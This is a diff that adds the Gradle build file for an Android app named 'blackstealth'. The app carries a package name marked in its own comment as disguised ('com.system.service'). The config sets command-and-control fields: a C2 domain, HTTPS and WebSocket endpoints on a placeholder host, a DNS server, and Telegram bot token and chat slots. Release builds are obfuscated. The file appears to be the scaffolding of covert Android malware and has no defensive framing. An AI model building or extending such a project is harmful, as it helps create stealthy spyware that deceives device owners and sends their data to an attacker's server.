@@ -1,0 +1,70 @@
+plugins {
+    id 'com.android.application'
+}
+
+android {
+    namespace 'com.offensive.blackstealth'
+    compileSdk 34
+
+    defaultConfig {
+        applicationId "com.system.service"  // Disguised package name
+        minSdk 24
+        targetSdk 34
+        versionCode 1
+        versionName "1.0"
+
+        // C2 Configuration - Replace before build
+        buildConfigField "String", "C2_DOMAIN", '"c2.example.com"'
+        buildConfigField "String", "C2_HTTPS", '"https://c2.example.com"'
+        buildConfigField "String", "C2_WS", '"wss://c2.example.com/ws"'
+        buildConfigField "String", "DNS_SERVER", '"8.8.8.8"'
+        buildConfigField "String", "TELEGRAM_TOKEN", '""'
+        buildConfigField "String", "TELEGRAM_CHAT", '""'
+        buildConfigField "String", "CERT_HASH", '""'
+    }
+
+    signingConfigs {
+        release {
+            // Configure your keystore
+            // storeFile file('release.keystore')
+            // storePassword 'password'
+            // keyAlias 'alias'
+            // keyPassword 'password'
+        }
+    }
+
+    buildTypes {
+        release {
+            minifyEnabled true
+            shrinkResources true
+            proguardFiles getDefaultProguardFile('proguard-android-optimize.txt'), 'proguard-rules.pro'
+            // signingConfig signingConfigs.release
+        }
+        debug {
+            minifyEnabled false
+            debuggable true
+        }
+    }
+
+    compileOptions {
+        sourceCompatibility JavaVersion.VERSION_17
+        targetCompatibility JavaVersion.VERSION_17
+    }
+
+    buildFeatures {
+        buildConfig true
+    }
+
+    packagingOptions {
+        exclude 'META-INF/DEPENDENCIES'
+        exclude 'META-INF/LICENSE'
+        exclude 'META-INF/LICENSE.txt'
+        exclude 'META-INF/NOTICE'
+    }
+}
+
+dependencies {
+    implementation 'androidx.appcompat:appcompat:1.6.1'
+    implementation 'androidx.core:core:1.12.0'
+    implementation 'androidx.work:work-runtime:2.8.1'
+}
